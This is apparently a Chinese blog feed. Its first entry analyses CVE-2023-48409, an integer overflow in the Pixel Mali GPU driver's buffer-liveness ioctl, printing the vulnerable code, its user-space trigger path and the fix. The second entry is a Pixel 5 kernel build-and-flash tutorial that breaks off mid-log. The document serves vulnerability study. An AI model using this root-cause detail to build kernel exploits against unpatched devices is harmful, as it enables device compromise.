    <content type="html"><![CDATA[<h2 id="0x01-具体背景"><a href="#0x01-具体背景" class="headerlink" title="0x01 具体背景"></a>0x01 具体背景</h2><p>很少能看到有关GPU 的漏洞披露信息，因此比较感兴趣的跟了一下这个漏洞。</p><p>看到有关pixel GPU 的漏洞利用： <a href="https://github.com/0x36/Pixel_GPU_Exploit">https://github.com/0x36/Pixel_GPU_Exploit</a> ， 这篇披露的文章中描述了对GPU 的漏洞利用情况，但我更感兴趣这个漏洞是具体的入口调用到目标漏洞函数的完整流程。</p><p>在Google 安全公告中有这个编号 <a href="https://source.android.com/docs/security/bulletin/pixel/2023-12-01">CVE-2023-48409</a>， 但是通过公告的信息是没办法获取到详细的修复缓解措施，还好披露文章中给出了修复的commitID 的链接。<br><a href="https://android.googlesource.com/kernel/google-modules/gpu/+/68073dce197709c025a520359b66ed12c5430914%5E%21/#F0">https://android.googlesource.com/kernel/google-modules/gpu/+/68073dce197709c025a520359b66ed12c5430914%5E%21/#F0</a></p><p><a href="https://android.googlesource.com/kernel/google-modules/gpu/+/68073dce197709c025a520359b66ed12c5430914/mali_kbase/mali_kbase_core_linux.c">https://android.googlesource.com/kernel/google-modules/gpu/+/68073dce197709c025a520359b66ed12c5430914/mali_kbase/mali_kbase_core_linux.c</a></p><h2 id="0x02-详情分析"><a href="#0x02-详情分析" class="headerlink" title="0x02 详情分析"></a>0x02 详情分析</h2><p>存在漏洞的函数</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs xl">int gpu_pixel_handle_buffer_liveness_update_ioctl(struct kbase_context* kctx,<br>                                                  struct kbase_ioctl_buffer_liveness_update* update)<br>&#123;<br>int err = <span class="hljs-number">0</span>;<br>struct gpu_slc_liveness_update_info info;<br>u64* buff;<br><br><br><span class="hljs-comment">/* Compute the sizes of the user space arrays that we need to copy */</span><br><span class="hljs-function"><span class="hljs-title">u64</span> const buffer_info_size = sizeof(u64) * update-&gt;</span>buffer_count; <span class="hljs-comment">// 计算需要复制的buffer_count 个u64类型元素的大小。</span><br>u64 const live_ranges_size =<br>    <span class="hljs-function"><span class="hljs-title">sizeof</span>(struct kbase_pixel_gpu_slc_liveness_mark) * update-&gt;</span>live_ranges_count; <span class="hljs-comment">// 获取总ranges 需要的大小，根据传入的live_ranges_count 进行计算。</span><br><br><span class="hljs-comment">/* Nothing to do */</span><br><span class="hljs-keyword">if</span> (!buffer_info_size || !live_ranges_size)<br>goto done;<br><br><span class="hljs-comment">/* Allocate the memory we require to copy from user space */</span><br>buff = kmalloc(buffer_info_size * <span class="hljs-number">2</span> + live_ranges_size, GFP_KERNEL); <span class="hljs-comment">// 给缓冲区分配大小</span><br><span class="hljs-keyword">if</span> (buff == NULL) &#123;<br><span class="hljs-function"><span class="hljs-title">dev_err</span>(kctx-&gt;</span><span class="hljs-function"><span class="hljs-title">kbdev</span>-&gt;</span>dev, <span class="hljs-string">&quot;pixel: failed to allocate buffer for liveness update&quot;</span>);<br>err = -ENOMEM;<br>goto done;<br>&#125;<br><span class="hljs-comment">/* Set up the info struct by pointing into the allocation. All 8 byte aligned */</span><br>info = (struct gpu_slc_liveness_update_info)&#123;<br>    .buffer_va = buff,<br>    .<span class="hljs-function"><span class="hljs-title">buffer_sizes</span> = buff + update-&gt;</span>buffer_count,<br>    .<span class="hljs-function"><span class="hljs-title">live_ranges</span> = (struct kbase_pixel_gpu_slc_liveness_mark*)(buff + update-&gt;</span>buffer_count * <span class="hljs-number">2</span>),<br>    .<span class="hljs-function"><span class="hljs-title">live_ranges_count</span> = update-&gt;</span>live_ranges_count,<br>&#125;;<br><span class="hljs-comment">/* Copy the data from user space */</span><br>err =<br>    <span class="hljs-function"><span class="hljs-title">copy_from_user</span>(info.live_ranges, u64_to_user_ptr(update-&gt;</span>live_ranges_address), live_ranges_size);<br><span class="hljs-keyword">if</span> (err) &#123;<br><span class="hljs-function"><span class="hljs-title">dev_err</span>(kctx-&gt;</span><span class="hljs-function"><span class="hljs-title">kbdev</span>-&gt;</span>dev, <span class="hljs-string">&quot;pixel: failed to copy live ranges&quot;</span>);<br>err = -EFAULT;<br>goto done;<br>&#125;<br>err = copy_from_user(<br>    <span class="hljs-function"><span class="hljs-title">info</span>.buffer_sizes, u64_to_user_ptr(update-&gt;</span>buffer_sizes_address), buffer_info_size);<br><span class="hljs-keyword">if</span> (err) &#123;<br><span class="hljs-function"><span class="hljs-title">dev_err</span>(kctx-&gt;</span><span class="hljs-function"><span class="hljs-title">kbdev</span>-&gt;</span>dev, <span class="hljs-string">&quot;pixel: failed to copy buffer sizes&quot;</span>);<br>err = -EFAULT;<br>goto done;<br>&#125;<br><span class="hljs-function"><span class="hljs-title">err</span> = copy_from_user(info.buffer_va, u64_to_user_ptr(update-&gt;</span>buffer_va_address), buffer_info_size);<br><span class="hljs-keyword">if</span> (err) &#123;<br><span class="hljs-function"><span class="hljs-title">dev_err</span>(kctx-&gt;</span><span class="hljs-function"><span class="hljs-title">kbdev</span>-&gt;</span>dev, <span class="hljs-string">&quot;pixel: failed to copy buffer addresses&quot;</span>);<br>err = -EFAULT;<br>goto done;<br>&#125;<br><span class="hljs-comment">/* Execute an slc update */</span><br>gpu_slc_liveness_update(kctx, &amp;info);<br>done:<br>kfree(buff);<br>return err;<br>&#125;<br></code></pre></td></tr></table></figure><p>函数原型copy_from_user<br>    <code>unsigned long copy_from_user(void *to, const void *from, unsigned long n);</code><br>第三个参数的值是无符号的长整型整数。</p><p>kmalloc()<br>        <code>static inline void *kmalloc(size_t size, gfp_t flags); /*返回的是虚拟地址*/</code><br>其中 size_t 类型是 C 中任何对象所能达到的最大长度，是无符号整数。</p><p>结构体</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs abnf">struct kbase_ioctl_buffer_liveness_update &#123;<br>        __u64 live_ranges_address<span class="hljs-comment">;</span><br>        __u64 live_ranges_count<span class="hljs-comment">;</span><br>        __u64 buffer_va_address<span class="hljs-comment">;</span><br>        __u64 buffer_sizes_address<span class="hljs-comment">;</span><br>        __u64 buffer_count<span class="hljs-comment">;</span><br>&#125;<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p>结合修复的注释与gpu_pixel_handle_buffer_liveness_update_ioctl 函数来一起分析</p><ul><li><ol><li>buffer_info_size 和 live_ranges_size 的值都是由用户传入的数据来定义</li></ol></li><li><ol start="2"><li>buff 局部变量会根据  buffer_info_size * 2 + live_ranges_size 来计算要通过kmalloc 分配所需的内存大小。</li></ol><ul><li>如果 buffer_info_size 和 live_ranges_size 都很大，会导致计算的值非常大。</li><li>kmalloc 第一个参数的值是无符号的数，因此会产生整数上溢的问题，进而分配一个很小的内存空间给buff</li></ul></li><li><ol start="3"><li>copy_from_user(info.live_ranges, u64_to_user_ptr(update-&gt;live_ranges_address), live_ranges_size); 这段代码会出现缓冲区溢出</li></ol><ul><li>因为 info.live_ranges 是由(buff + update-&gt;buffer_count * 2) 定义的指针，因此在正常情况下，info.live_ranges是不会超过buffer内存区域的，但实际上已经指向了错误的内存区域。</li><li>由于buffer 的内存区域很小，而从用户空间要拷贝的数据live_ranges_size 很大，因此在内核中会造成缓冲区溢出的问题。</li></ul></li><li><p><code>kmalloc</code> 调用实际上可能会分配比预期少的内存。</p></li><li><p>这可能导致 <code>info</code> 结构体的指针指向错误的内存区域。</p></li><li><p>当尝试从用户空间复制数据到这些指针指向的内存时，可能会访问到未分配或不允许的内存区域，导致程序崩溃或安全漏洞。</p></li></ul><p><strong>函数调用流程</strong></p><p>在分析完漏洞成因之后，再分析一下这个漏洞该如何通过用户空间来触发，根据披露的信息来看，该利用访问了 &#x2F;dev&#x2F;mail0 这个字符设备。下面梳理一下正向的函数之间的调用关系。</p><p>首先是驱动注册，这里将驱动注册成了一个平台设备驱动，这种驱动一般用在各种集成在系统芯片上的硬件，比如过SOC 上的GPU，DSP等，并且使用platform_device 结构体来注册，这个结构体包含了设备名称和驱动程序需要的资源，另外平台设备驱动的加载依赖于系统启动时的自动发现机制，并且这个机制是根据 of_match_table 的硬件id 来进行匹配并加载。</p><blockquote><p>&#x2F;mali_kbase&#x2F;mali_kbase_core_linux.c<br><img src="/59__Google%20Securitybulletins%20CVE-2023-48409%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.assets/image-20240806141643578.png"></p></blockquote><p>平台设备的probe 注册函数， 这个函数会在驱动加载的时候，自动执行。<br><strong>kbase_platform_device_probe</strong></p><blockquote><p>mali_kbase&#x2F;mali_kbase_core_linux.c<br><img src="/59__Google%20Securitybulletins%20CVE-2023-48409%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.assets/image-20240806141049017.png"></p></blockquote><p>kbase_device_init 这个函数会<br>    - 1. 调用 kbase_device_id_init 函数来初始化驱动的名称<br>    - 2. 初始化kbdev 设备结构体，然后执行dev_init 结构体中的一系列的初始化函数，其中包括kbase_sysfs_init，这个函数再后面会用到<br>        <code>&#123; kbase_sysfs_init, kbase_sysfs_term, &quot;SysFS group creation failed&quot; &#125;,</code><br><strong>kbase_device_init</strong></p><blockquote><p>mali_kbase&#x2F;device&#x2F;backend&#x2F;mali_kbase_device_csf.c<br><img src="/59__Google%20Securitybulletins%20CVE-2023-48409%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.assets/image-20240806135846628.png"></p></blockquote><p>kbase_device_id_init函数是给 kbdev-&gt;devname 赋值，也就是poc 中的 mail0 驱动名称。<br><strong>kbase_device_id_init</strong></p><blockquote><p>&#x2F;device&#x2F;mali_kbase_device.c<br><img src="/59__Google%20Securitybulletins%20CVE-2023-48409%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.assets/image-20240806134101273.png"></p></blockquote><p>kbase_sysfs_init 函数也是驱动设备初始化的函数，将驱动设备名称 mail0 和 kbase_fops 进行绑定，函数是在 kbase_device_init 阶段进行初始化的。<br><strong>kbase_sysfs_init</strong></p><blockquote><p>&#x2F;mali_kbase&#x2F;mali_kbase_core_linux.c<br><img src="/59__Google%20Securitybulletins%20CVE-2023-48409%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.assets/image-20240806111456897.png"></p></blockquote><p>到这里有关整体的驱动加载注册的过程已经结束了。</p><p>调用驱动字符设备驱动，很关键的函数时ioctl，因此找到 kbase_fops<br>这里会实现file_operations 结构体，提供系统调用的接口。<br><strong>kbase_fops</strong></p><blockquote><p>mali_kbase&#x2F;mali_kbase_core_linux.c<br><img src="/59__Google%20Securitybulletins%20CVE-2023-48409%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.assets/image-20240806110922142.png"></p></blockquote><p><strong>kbase_ioctl</strong></p><blockquote><p>mali_kbase&#x2F;mali_kbase_core_linux.c<br><img src="/59__Google%20Securitybulletins%20CVE-2023-48409%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.assets/image-20240806110850170.png"></p></blockquote><p>kbase_kfile_ioctl 函数才是真正的 ioctl 的实现函数，里面会获取用户传入的结构体数据以及对应要处理的cmd 对应的case。</p><ul><li>在 KBASE_IOCTL_BUFFER_LIVENESS_UPDATE case 中，会调用kbase_api_buffer_liveness_update 函数处理用户传入过来的 kbase_ioctl_buffer_liveness_update结构体数据。<br><strong>kbase_kfile_ioctl</strong>()<blockquote><p>&#x2F;mali_kbase&#x2F;mali_kbase_core_linux.c<br><img src="/59__Google%20Securitybulletins%20CVE-2023-48409%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.assets/image-20240806102731813.png"></p></blockquote><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">case</span> KBASE_IOCTL_BUFFER_LIVENESS_UPDATE:<br><span class="hljs-built_in">KBASE_HANDLE_IOCTL_IN</span>(KBASE_IOCTL_BUFFER_LIVENESS_UPDATE,<br>kbase_api_buffer_liveness_update,<br><span class="hljs-keyword">struct</span> kbase_ioctl_buffer_liveness_update,<br>kctx);<br><span class="hljs-keyword">break</span>;<br>&#125;<br></code></pre></td></tr></table></figure></li></ul><p>其中调用的宏  KBASE_HANDLE_IOCTL_IN 的定义如下所示，会调用函数来处理用户空间传递过来的数据，<br><img src="/59__Google%20Securitybulletins%20CVE-2023-48409%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.assets/image-20240806143629666.png"></p><p>最终会走到漏洞触发函数中。<br><strong>kbase_api_buffer_liveness_update</strong></p><blockquote><p>mali_kbase&#x2F;mali_kbase_core_linux.c<br><img src="/59__Google%20Securitybulletins%20CVE-2023-48409%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.assets/image-20240806102549318.png"></p></blockquote><h2 id="0x03-修复分析"><a href="#0x03-修复分析" class="headerlink" title="0x03 修复分析"></a>0x03 修复分析</h2><p>为什么要这么修复<br><img src="/59__Google%20Securitybulletins%20CVE-2023-48409%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.assets/image-20240805172840663.png"></p><p>buffer_info_size * 2 + live_ranges_size &lt; U64_MAX ，防止buff 分配的 buffer_info_size * 2 + live_ranges_size 过大，从而引发整数上溢，那么给buffer 分配的内存大小就会过小，引发其他的溢出问题。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>pixel 5 编译自定义内核全过程</title>
    <link href="/2024/07/28/5__pixel5_build_custom_kernel/"/>
    <url>/2024/07/28/5__pixel5_build_custom_kernel/</url>
    
    <content type="html"><![CDATA[<h2 id="0x01-编译背景"><a href="#0x01-编译背景" class="headerlink" title="0x01 编译背景"></a>0x01 编译背景</h2><p>本片文章讲描述如何编译pixel 5 内核，pixel 5 内核编译的过程和pixel 6的有很大的不同。</p><p>接来跟着我一起了解如何编译出pixel 5内核，我会给出详细的步骤说明，我遇到的问题以及pixel5 是非GKI，是如何编译出内核的。</p><p>首先有关 内核编译的基础知识参考： <a href="https://source.android.google.cn/docs/setup/build/building-pixel-kernels?hl=zh-cn#restore_the_factory_images">https://source.android.google.cn/docs/setup/build/building-pixel-kernels?hl=zh-cn#restore_the_factory_images</a></p><p>旧版Pixel 内核： <a href="https://source.android.google.cn/docs/setup/build/building-pixel-kernels?hl=zh-cn#restore_the_factory_images">https://source.android.google.cn/docs/setup/build/building-pixel-kernels?hl=zh-cn#restore_the_factory_images</a></p><p>为了防止手机刷入失败，无法正常开始，可以下载原有的固件包:  <a href="https://developers.google.com/android/images?hl=zh-cn">https://developers.google.com/android/images?hl=zh-cn</a></p><p>编译环境:  Ubuntu18.04 (300G + 32G内存 )</p><p>当前手机的内核信息</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dns">Linux localhost <span class="hljs-number">4.19.110</span>-g9ceb3bf92e0a-ab<span class="hljs-number">6790968</span> #<span class="hljs-number">2</span> SMP PREEMPT Wed Aug <span class="hljs-number">26 04:14:37</span> UTC <span class="hljs-number">2020</span> aarch64<br><br>版本号: RD1A.<span class="hljs-number">200810.021</span>.B3<br></code></pre></td></tr></table></figure><h2 id="0x02-下载内核-编译内核"><a href="#0x02-下载内核-编译内核" class="headerlink" title="0x02 下载内核 &amp; 编译内核"></a>0x02 下载内核 &amp; 编译内核</h2><p>首先拉取 android-msm-redbull-4.19-android11-qpr2 分支的代码</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">repo</span> init -u https://android.googlesource.com/kernel/manifest -b android-msm-redbull-<span class="hljs-number">4</span>.<span class="hljs-number">19</span>-android11-qpr2<br></code></pre></td></tr></table></figure><p>然后同步代码， 这可能需要花一些时间，喝杯咖啡，等待。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">repo <span class="hljs-built_in">sync</span><br></code></pre></td></tr></table></figure><p>同步完代码之后你会获取到如下所示的结构<br><img src="/5__pixel5_build_custom_kernel.assets/image-20240728162647213.png"><br>进入到 private 的目录中，这里存放着内核所需的所有代码，并且将当前分支checkout到当前手机内核的CommitID，否则运行 <code>redbull_build.sh</code>会报错。</p><blockquote><p>commitID 可以执行 uname -a 查看</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> /private/msm-google/ ; git checkout 9ceb3bf92e0a<br></code></pre></td></tr></table></figure><p>编译内核，如果你的编译环境资源有限，那么编译的过程需要很长一段时间。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">./build_redbull.sh<br></code></pre></td></tr></table></figure><p><img src="/5__pixel5_build_custom_kernel.assets/image-20240728165405976.png"><br>编译完成后，在 <code>out</code>目录中可以看到 <code>boot.img</code>, <code>vendor_boot.img</code>，还有很多的驱动模块文件。<br><img src="/5__pixel5_build_custom_kernel.assets/image-20240728163319363.png"><br>这个时候，你以为你已经顺利的将内核镜像编译出来，然后迫不及待的刷入到手机中，很不幸，我尝试了很多遍，手机会开不了机，手机会一直在 bootloader页面，仿佛少了很多必要的文件。</p><p>其实这是因为Google Android 推行GKI 机制之后，部分设备的内核和Android 源码库可以分离，单独编译内核和AOSP，因此pixel 5 的内核不能单独编译。</p><p>因此需要和AOSP 一起进行编译。</p><h2 id="0x03-AOSP编译"><a href="#0x03-AOSP编译" class="headerlink" title="0x03 AOSP编译"></a>0x03 AOSP编译</h2><p>拉取AOSP 的 android-11.0.0_r34  分支的代码并同步代码</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs elixir">root@<span class="hljs-symbol">:~/aosp/pixel5_android-</span><span class="hljs-number">11.0</span>.<span class="hljs-number">0_</span>r34<span class="hljs-comment"># repo init -u https://android.googlesource.com/platform/manifest -b android-11.0.0_r34</span><br>root@<span class="hljs-symbol">:~/aosp/pixel5_android-</span><span class="hljs-number">11.0</span>.<span class="hljs-number">0_</span>r34<span class="hljs-comment"># repo sync</span><br></code></pre></td></tr></table></figure><p><img src="/5__pixel5_build_custom_kernel.assets/image-20240728164737897.png"></p><p>下载vendor 对应的驱动镜像： <a href="https://developers.google.com/android/drivers#bramblerd1a.200810.021.b3">https://developers.google.com/android/drivers#bramblerd1a.200810.021.b3</a><br><img src="/5__pixel5_build_custom_kernel.assets/image-20240728164938312.png"><br>获取到vendor 驱动镜像zip 后，解开会获取到<code>extract-google_devices-redfin.sh</code> 文件。</p><ol><li>赋予文件执行的权限，然后执行sh 脚本</li><li>执行脚本后，会新建vendor 文件夹，给 vendor 文件夹权限<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs elixir">root@<span class="hljs-symbol">:~/aosp/pixel5_android-</span><span class="hljs-number">11.0</span>.<span class="hljs-number">0_</span>r34<span class="hljs-comment"># chmod 777 extract-google_devices-redfin.sh</span><br>root@<span class="hljs-symbol">:~/aosp/pixel5_android-</span><span class="hljs-number">11.0</span>.<span class="hljs-number">0_</span>r34<span class="hljs-comment"># ./extract-google_devices-redfin.sh</span><br>root@<span class="hljs-symbol">:~/aosp/pixel5_android-</span><span class="hljs-number">11.0</span>.<span class="hljs-number">0_</span>r34<span class="hljs-comment"># chmod -R 777 vendor/</span><br></code></pre></td></tr></table></figure></li></ol><p>开始编译</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs elixir">root<span class="hljs-variable">@4</span><span class="hljs-symbol">:~/aosp/pixel5_android-</span><span class="hljs-number">11.0</span>.<span class="hljs-number">0_</span>r34<span class="hljs-comment"># source build/envsetup.sh</span><br>root<span class="hljs-variable">@4</span><span class="hljs-symbol">:~/aosp/pixel5_android-</span><span class="hljs-number">11.0</span>.<span class="hljs-number">0_</span>r34<span class="hljs-comment"># lunch // select aosp_redfin-userdebug</span><br>root<span class="hljs-variable">@4</span><span class="hljs-symbol">:~/aosp/pixel5_android-</span><span class="hljs-number">11.0</span>.<span class="hljs-number">0_</span>r34<span class="hljs-comment"># make</span><br></code></pre></td></tr></table></figure><p>编译的时间会要很久<br><img src="/5__pixel5_build_custom_kernel.assets/image-20240728170904774.png"><br>现在可以将编译好的镜像刷入到手机中</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">E</span>:\android-<span class="hljs-number">11</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>_r34&gt;set ANDROID_PRODUCT_OUT=./<br><span class="hljs-attribute">E</span>:\android-<span class="hljs-number">11</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>_r34&gt;fastboot flashall -w<br><span class="hljs-attribute">E</span>:\android-<span class="hljs-number">11</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>_r34 DIR:<br><span class="hljs-attribute">2024</span>/<span class="hljs-number">06</span>/<span class="hljs-number">19</span>  <span class="hljs-number">15</span>:<span class="hljs-number">57</span>    &lt;DIR&gt;          .<br><span class="hljs-attribute">2024</span>/<span class="hljs-number">06</span>/<span class="hljs-number">19</span>  <span class="hljs-number">15</span>:<span class="hljs-number">57</span>    &lt;DIR&gt;          ..<br><span class="hljs-attribute">2024</span>/<span class="hljs-number">06</span>/<span class="hljs-number">19</span>  <span class="hljs-number">15</span>:<span class="hljs-number">57</span>                <span class="hljs-number">22</span> android-info.txt<br><span class="hljs-attribute">2024</span>/<span class="hljs-number">06</span>/<span class="hljs-number">19</span>  <span class="hljs-number">15</span>:<span class="hljs-number">52</span>        <span class="hljs-number">26</span>,<span class="hljs-number">533</span>,<span class="hljs-number">888</span> boot-debug.img<br><span class="hljs-attribute">2024</span>/<span class="hljs-number">06</span>/<span class="hljs-number">19</span>  <span class="hljs-number">15</span>:<span class="hljs-number">52</span>       <span class="hljs-number">100</span>,<span class="hljs-number">663</span>,<span class="hljs-number">296</span> boot.img<br><span class="hljs-attribute">2024</span>/<span class="hljs-number">06</span>/<span class="hljs-number">19</span>  <span class="hljs-number">15</span>:<span class="hljs-number">51</span>         <span class="hljs-number">9</span>,<span class="hljs-number">103</span>,<span class="hljs-number">752</span> bootloader.img<br><span class="hljs-attribute">2024</span>/<span class="hljs-number">06</span>/<span class="hljs-number">19</span>  <span class="hljs-number">15</span>:<span class="hljs-number">51</span>           <span class="hljs-number">335</span>,<span class="hljs-number">787</span> dtb.img<br><span class="hljs-attribute">2024</span>/<span class="hljs-number">06</span>/<span class="hljs-number">19</span>  <span class="hljs-number">15</span>:<span class="hljs-number">51</span>        <span class="hljs-number">16</span>,<span class="hljs-number">777</span>,<span class="hljs-number">216</span> dtbo.img<br><span class="hljs-attribute">2024</span>/<span class="hljs-number">06</span>/<span class="hljs-number">19</span>  <span class="hljs-number">15</span>:<span class="hljs-number">51</span>       <span class="hljs-number">239</span>,<span class="hljs-number">603</span>,<span class="hljs-number">860</span> product.img<br><span class="hljs-attribute">2024</span>/<span class="hljs-number">06</span>/<span class="hljs-number">19</span>  <span class="hljs-number">15</span>:<span class="hljs-number">50</span>       <span class="hljs-number">137</span>,<span class="hljs-number">891</span>,<span class="hljs-number">980</span> radio.img<br><span class="hljs-attribute">2024</span>/<span class="hljs-number">06</span>/<span class="hljs-number">19</span>  <span class="hljs-number">15</span>:<span class="hljs-number">50</span>        <span class="hljs-number">14</span>,<span class="hljs-number">426</span>,<span class="hljs-number">115</span> ramdisk-debug.img<br><span class="hljs-attribute">2024</span>/<span class="hljs-number">06</span>/<span class="hljs-number">19</span>  <span class="hljs-number">15</span>:<span class="hljs-number">50</span>        <span class="hljs-number">14</span>,<span class="hljs-number">252</span>,<span class="hljs-number">291</span> ramdisk-recovery.img<br><span class="hljs-attribute">2024</span>/<span class="hljs-number">06</span>/<span class="hljs-number">19</span>  <span class="hljs-number">15</span>:<span class="hljs-number">50</span>           <span class="hljs-number">940</span>,<span class="hljs-number">919</span> ramdisk.img<br><span class="hljs-attribute">2024</span>/<span class="hljs-number">06</span>/<span class="hljs-number">19</span>  <span class="hljs-number">15</span>:<span class="hljs-number">50</span>             <span class="hljs-number">4</span>,<span class="hljs-number">976</span> super_empty.img<br><span class="hljs-attribute">2024</span>/<span class="hljs-number">06</span>/<span class="hljs-number">19</span>  <span class="hljs-number">15</span>:<span class="hljs-number">50</span>       <span class="hljs-number">880</span>,<span class="hljs-number">324</span>,<span class="hljs-number">888</span> system.img<br><span class="hljs-attribute">2024</span>/<span class="hljs-number">06</span>/<span class="hljs-number">19</span>  <span class="hljs-number">15</span>:<span class="hljs-number">47</span>       <span class="hljs-number">107</span>,<span class="hljs-number">098</span>,<span class="hljs-number">236</span> system_ext.img<br><span class="hljs-attribute">2024</span>/<span class="hljs-number">06</span>/<span class="hljs-number">19</span>  <span class="hljs-number">15</span>:<span class="hljs-number">47</span>        <span class="hljs-number">24</span>,<span class="hljs-number">416</span>,<span class="hljs-number">368</span> system_other.img<br><span class="hljs-attribute">2024</span>/<span class="hljs-number">06</span>/<span class="hljs-number">19</span>  <span class="hljs-number">15</span>:<span class="hljs-number">47</span>         <span class="hljs-number">2</span>,<span class="hljs-number">785</span>,<span class="hljs-number">604</span> userdata.img<br><span class="hljs-attribute">2024</span>/<span class="hljs-number">06</span>/<span class="hljs-number">19</span>  <span class="hljs-number">15</span>:<span class="hljs-number">47</span>             <span class="hljs-number">8</span>,<span class="hljs-number">192</span> vbmeta.img<br><span class="hljs-attribute">2024</span>/<span class="hljs-number">06</span>/<span class="hljs-number">19</span>  <span class="hljs-number">15</span>:<span class="hljs-number">47</span>             <span class="hljs-number">4</span>,<span class="hljs-number">096</span> vbmeta_system.img<br><span class="hljs-attribute">2024</span>/<span class="hljs-number">06</span>/<span class="hljs-number">19</span>  <span class="hljs-number">15</span>:<span class="hljs-number">47</span>         <span class="hljs-number">8</span>,<span class="hljs-number">566</span>,<span class="hljs-number">493</span> vendor-ramdisk-debug.cpio.lz4<br><span class="hljs-attribute">2024</span>/<span class="hljs-number">06</span>/<span class="hljs-number">19</span>  <span class="hljs-number">15</span>:<span class="hljs-number">47</span>       <span class="hljs-number">706</span>,<span class="hljs-number">507</span>,<span class="hljs-number">008</span> vendor.img<br><span class="hljs-attribute">2024</span>/<span class="hljs-number">06</span>/<span class="hljs-number">19</span>  <span class="hljs-number">15</span>:<span class="hljs-number">45</span>         <span class="hljs-number">8</span>,<span class="hljs-number">908</span>,<span class="hljs-number">800</span> vendor_boot-debug.img<br><span class="hljs-attribute">2024</span>/<span class="hljs-number">06</span>/<span class="hljs-number">19</span>  <span class="hljs-number">15</span>:<span class="hljs-number">45</span>       <span class="hljs-number">100</span>,<span class="hljs-number">663</span>,<span class="hljs-number">296</span> vendor_boot.img<br></code></pre></td></tr></table></figure><p><strong>fastboot flashall -w</strong> 完整日志</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span 